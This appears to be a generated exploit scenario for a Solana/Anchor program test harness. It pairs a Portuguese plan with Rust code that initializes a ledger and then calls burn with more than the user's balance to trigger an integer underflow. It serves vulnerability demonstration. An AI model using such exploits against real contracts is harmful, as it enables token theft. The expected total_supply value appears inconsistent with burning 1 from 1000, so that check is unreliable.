{
  "plan": "O cenário inicializa o ledger com a instrução initialize (baseline) definindo authority, total_supply=1000 e user_balance=0. Em seguida, o ataque chama burn com amount=1, que é maior que user_balance=0, explorando o wrapping_sub. O efeito medido é que user_balance e total_supply dão a volta para u64::MAX e u64::MAX-1000 respectivamente, em vez de a instrução falhar.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger ainda não inicializada
let ledger_account = empty_account();

// Contas para initialize
let contas_init = vec![
    (ledger_key, ledger_account.clone()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

// Metas para initialize
let metas_init = vec![
    AccountMeta::new(ledger_key, true),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(solana_program::system_program::id(), false),
];

// Instrução initialize com initial_supply = 1000
let ix_init = env.anchor_ix("initialize", &(1000u64,), metas_init);

// Baseline: initialize deve ter sucesso
let r_init = env.baseline("initialize ledger", &ix_init, &contas_init);

// Extrai a conta ledger resultante do baseline
let ledger_after_init = r_init.resulting_accounts.iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, a)| a.clone())
    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data("Ledger", &(authority, 1000u64, 0u64)), None));

// Contas para burn
let contas_burn = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

// Metas para burn
let metas_burn = vec![
    AccountMeta::new(ledger_key, false),
    AccountMeta::new_readonly(authority, true),
];

// Ataque: burn com amount = 1 (maior que user_balance = 0)
let ix_attack = env.anchor_ix("burn", &(1u64,), metas_burn);
let r_attack = env.attack("burn com amount > user_balance", &ix_attack, &contas_burn);

// Efeito: se o ataque teve sucesso, verifica underflow
if r_attack.program_result == ProgramResult::Success {
    let ledger_data = after(&r_attack, &ledger_key).data();
    // Layout: 8 bytes discriminador + 32 authority + 8 total_supply + 8 user_balance
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect("user_balance deu underflow para u64::MAX", user_balance == u64::MAX);
    env.effect("total_supply deu underflow para u64::MAX - 1000", total_supply == u64::MAX - 1000);
}"
}

